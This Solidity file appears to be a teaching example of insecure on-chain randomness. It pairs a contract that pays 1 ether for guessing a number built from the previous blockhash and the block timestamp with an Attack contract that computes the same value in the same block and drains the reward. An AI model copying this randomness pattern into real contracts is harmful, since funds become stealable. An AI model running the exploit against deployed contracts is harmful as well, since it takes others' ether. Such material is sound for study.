// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract GuessTheRandomNumber {
    constructor() payable {}
     uint public Guess;
    function guess(uint answer) public {
         uint _guess = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack{
    receive() external payable {

    }

    function attack(GuessTheRandomNumber _guessTheRandomNumber) public  {
        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp)));

        _guessTheRandomNumber.guess(answer);

    }

    function getBalance() public view returns (uint){
       return  address(this).balance;
    }
}